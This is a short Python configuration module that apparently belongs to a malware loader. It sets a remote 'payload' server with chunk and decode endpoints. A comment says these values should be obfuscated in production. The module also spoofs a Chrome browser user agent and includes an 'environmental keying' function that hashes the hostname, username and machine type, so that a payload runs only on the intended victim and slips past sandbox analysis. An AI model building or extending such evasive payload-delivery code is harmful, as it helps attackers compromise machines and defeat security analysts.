import platform
import hashlib
import os

class Config:
    # In production, these should be obfuscated or dynamically resolved
    BASE_URL = "https://payload.bsi.deno.net" 
    API_CHUNKS = "/api/chunks"
    API_DECODE = "/api/decode"
    
    # Fake User Agent mimicking Chrome on Windows
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def get_env_hash():
    """Generates a hash based on the environment (Environmental Keying)."""
    # Combine hostname + username + machine type
    data = platform.node() + os.getlogin() + platform.machine()
    return hashlib.sha256(data.encode()).hexdigest()
